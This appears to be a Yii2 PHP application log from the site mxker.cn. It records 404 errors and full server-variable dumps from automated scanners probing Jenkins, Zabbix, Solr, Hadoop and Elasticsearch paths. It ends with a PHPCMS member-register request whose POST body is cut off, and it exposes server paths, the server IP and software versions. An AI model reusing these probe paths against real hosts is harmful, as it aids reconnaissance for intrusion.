+2017-07-13 11:53:50 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:53:50 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/please_read/_search'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '22668'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918030.397
+    'REQUEST_TIME' => 1499918030
+]
+2017-07-13 11:54:11 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/layouts/main.php:158
+    in /edu/frontend/controllers/SiteController.php:32
+2017-07-13 11:54:11 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '37414'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918051.8823
+    'REQUEST_TIME' => 1499918051
+]
+2017-07-13 11:54:27 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "jenkins/".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('jenkins/', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:54:27 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:54:27 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/jenkins/'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '48982'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918067.0663
+    'REQUEST_TIME' => 1499918067
+]
+2017-07-13 11:54:39 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "zabbix/".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('zabbix/', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:54:39 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:54:39 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/zabbix/'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '57787'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918079.0809
+    'REQUEST_TIME' => 1499918079
+]
+2017-07-13 11:54:44 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/layouts/main.php:158
+    in /edu/frontend/controllers/SiteController.php:32
+2017-07-13 11:54:44 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '61641'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918084.4705
+    'REQUEST_TIME' => 1499918084
+]
+2017-07-13 11:54:45 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "solr/".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('solr/', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:54:45 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:54:45 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/solr/'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '62024'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918085.0669
+    'REQUEST_TIME' => 1499918085
+]
+2017-07-13 11:54:49 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/layouts/main.php:158
+    in /edu/frontend/controllers/SiteController.php:32
+2017-07-13 11:54:49 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '65085'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918089.9563
+    'REQUEST_TIME' => 1499918089
+]
+2017-07-13 11:55:08 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "info".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('info', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:55:08 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:55:08 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/info'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '13154'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918108.8938
+    'REQUEST_TIME' => 1499918108
+]
+2017-07-13 11:55:38 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "dfshealth.jsp".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('dfshealth.jsp', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:55:38 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:55:38 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/dfshealth.jsp'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '31228'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918138.4971
+    'REQUEST_TIME' => 1499918138
+]
+2017-07-13 11:55:53 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "hadoop/dfshealth.jsp".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('hadoop/dfshealt...', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:55:53 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:55:53 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/hadoop/dfshealth.jsp'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '41657'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918153.9831
+    'REQUEST_TIME' => 1499918153
+]
+2017-07-13 13:06:34 [38.107.180.164][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 38.107.180.164
+    in /edu/frontend/views/layouts/main.php:158
+    in /edu/frontend/controllers/SiteController.php:32
+2017-07-13 13:06:34 [38.107.180.164][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '38.107.180.164'
+    'REMOTE_PORT' => '46720'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_HOST' => '120.27.33.23'
+    'HTTP_USER_AGENT' => 'Mozilla/5.0 zgrab/0.x'
+    'HTTP_ACCEPT_ENCODING' => 'gzip'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499922394.9036
+    'REQUEST_TIME' => 1499922394
+]
+2017-07-13 14:07:32 [140.205.205.3][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.205.3
+    in /edu/frontend/views/layouts/main.php:158
+    in /edu/frontend/controllers/SiteController.php:32
+2017-07-13 14:07:32 [140.205.205.3][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.205.3'
+    'REMOTE_PORT' => '42300'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_HOST' => 'www.mxker.cn'
+    'HTTP_ACCEPT_LANGUAGE' => 'en'
+    'HTTP_ACCEPT_ENCODING' => 'gzip,deflate'
+    'HTTP_ACCEPT' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499926052.7747
+    'REQUEST_TIME' => 1499926052
+]
+2017-07-13 14:45:27 [140.205.201.33][-][-][error][yii\web\HttpException:400] exception 'yii\web\BadRequestHttpException' with message '您提交的数据无法被验证。' in /edu/vendor/yiisoft/yii2/web/Controller.php:110
+Stack trace:
+#0 /edu/frontend/components/Controller.php(13): yii\web\Controller->beforeAction(Object(yii\base\InlineAction))
+#1 /edu/vendor/yiisoft/yii2/base/Controller.php(152): frontend\components\Controller->beforeAction(Object(yii\base\InlineAction))
+#2 /edu/vendor/yiisoft/yii2/base/Module.php(454): yii\base\Controller->runAction('index', Array)
+#3 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('', Array)
+#4 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#5 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#6 {main}
+2017-07-13 14:45:27 [140.205.201.33][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.201.33
+    in /edu/frontend/views/site/error_500.php:33
+    in /edu/frontend/controllers/SiteController.php:105
+2017-07-13 14:45:26 [140.205.201.33][-][-][info][application] $_GET = [
+    'm' => 'member'
+    'c' => 'index'
+    'a' => 'register'
+    'siteid' => '1'
+]
+
+$_POST = [
+    'siteid' => '1'
